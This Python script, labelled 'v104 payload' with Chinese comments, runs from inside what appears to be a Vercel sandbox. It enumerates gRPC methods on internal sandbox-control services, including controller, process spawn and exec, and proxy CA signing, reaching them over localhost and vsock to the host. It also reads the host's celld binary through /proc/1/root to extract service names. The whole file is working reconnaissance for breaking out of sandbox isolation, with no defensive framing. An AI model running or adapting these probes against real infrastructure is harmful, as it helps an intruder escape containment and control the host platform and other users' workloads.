# -*- coding: utf-8 -*-
"""v104 payload: 23456/2050 gRPC 方法探测 + celld proto 提取
P1 23456 gRPC: sandbox.Controller + cell.api.processes.Processes 方法字典
P2 2050 gRPC: OCI-image/containerd 方法字典
P3 celld proto/service/method 全提取
输出 /vercel/sandbox/v104c.out"""
import os, socket, struct, time, subprocess, signal, ctypes, re

OUT = '/vercel/sandbox/v104c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def sh(cmd, t=8):
    try:
        r = subprocess.run(['/bin/sh', '-c', cmd], capture_output=True, timeout=t)
        return (r.stdout or b'') + (r.stderr or b'')
    except Exception as e:
        return ('EXC %s' % type(e).__name__).encode()


def h2_frame(t, flags, stream, payload):
    return struct.pack('>I', len(payload))[1:] + bytes([t, flags]) + struct.pack('>I', stream) + payload


def grpc_req(port, path, body=b'', t=2.0):
    """H2 POST + application/grpc"""
    try:
        s = socket.socket(40, socket.SOCK_STREAM) if port < 10000 else socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        if port < 10000:
            s.connect((2, port))
        else:
            s.connect(('127.0.0.1', port))
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        s.sendall(h2_frame(4, 0, 0, b''))
        time.sleep(0.15)
        try:
            d0 = s.recv(1024)
        except Exception:
            d0 = b''
        if d0:
            s.sendall(h2_frame(4, 1, 0, b''))
        # HPACK: :method POST(0x83), :scheme http(0x86), :path, :authority, content-type application/grpc
        pv = path.encode()
        hp = b'\x83\x86' + b'\x44' + bytes([len(pv)]) + pv + b'\x41\x09localhost'
        hp += b'\x40' + b'\x0ccontent-type' + b'\x10application/grpc'
        s.sendall(h2_frame(1, 0x4, 1, hp))  # HEADERS END_HEADERS
        if body:
            s.sendall(h2_frame(0, 0x1, 1, body))  # DATA END_STREAM
        d2 = b''
        try:
            while len(d2) < 65536:
                c = s.recv(8192)
                if not c:
                    break
                d2 += c
        except Exception:
            pass
        info = []
        off = 0
        while off + 9 <= len(d2):
            ln = int.from_bytes(d2[off:off + 3], 'big')
            typ = d2[off + 3]
            fl = d2[off + 4]
            pay = d2[off + 9:off + 9 + ln]
            if typ == 1:
                info.append('HDR[%s]' % pay.hex()[:160])
            elif typ == 0:
                info.append('DATA[%s]' % pay[:120].hex())
            elif typ == 7:
                info.append('GOAWAY[%s]' % pay[-4:].hex())
            elif typ == 2:
                info.append('RST[%s]' % pay[:4].hex())
            else:
                info.append('T%d' % typ)
            off += 9 + ln
        log('GRPC %s %s -> %dB %s' % ('p%d' % port, path, len(d2), ';'.join(info)[:350]))
        s.close()
    except Exception as e:
        log('GRPC %s %s EXC %s' % ('p%d' % port, path, type(e).__name__))


# ---------- P1 23456 gRPC ----------
log('=== P1 23456 grpc ===')
svcs = [
    ('sandbox.Controller', ['Status', 'Start', 'Stop', 'Update', 'Shutdown', 'Create', 'Platform', 'Metrics', 'Delete', 'Restart', 'Pause', 'Resume']),
    ('cell.api.processes.Processes', ['Spawn', 'Exec', 'Kill', 'List', 'Wait', 'Connect', 'Signal', 'Pty', 'Snapshot', 'Restore']),
    ('vercel.sandbox.spawn.v1.SpawnService', ['Spawn', 'Status', 'Kill']),
]
for svc, methods in svcs:
    for m in methods:
        grpc_req(23456, '%s/%s' % (svc, m), b'\x00\x00\x00\x00\x00')

# ---------- P2 2050 gRPC ----------
log('=== P2 2050 grpc ===')
svcs2 = [
    ('vercel.oci.v1.OciImage', ['Get', 'Resolve', 'Pull', 'Push', 'Mount', 'Unmount', 'Inspect', 'List']),
    ('containerd.services.images.v1.Images', ['List', 'Get', 'Pull']),
    ('vercel.cache.v1.Cache', ['Get', 'Put', 'Exists', 'Delete']),
    ('vercel.proxy.v1.ProxyCa', ['Get', 'Sign', 'List']),
    ('vercel.resource.v1.ResourceUsage', ['Get', 'Report', 'List']),
]
for svc, methods in svcs2:
    for m in methods:
        grpc_req(2050, '%s/%s' % (svc, m), b'\x00\x00\x00\x00\x00')

# ---------- P3 celld proto 提取 ----------
log('=== P3 celld protos ===')
try:
    fp = '/proc/1/root/opt/vercel/celld'
    pat = re.compile(rb'[A-Za-z0-9_/.-]{10,}')
    hits = set()
    with open(fp, 'rb') as fh:
        while True:
            d = fh.read(0x400000)
            if not d:
                break
            for s in pat.findall(d):
                sl = s.lower()
                if b'.proto' in sl or (b'service' in sl and b'vercel' in sl) or (b'.v1.' in sl and len(s) < 80):
                    hits.add(s[:120])
    log('proto hits: %d' % len(hits))
    for s in sorted(hits)[:80]:
        log('  ' + s.decode(errors='replace'))
except Exception as e:
    log('P3 EXC %s' % type(e).__name__)

log('V104C_DONE')
f.close()
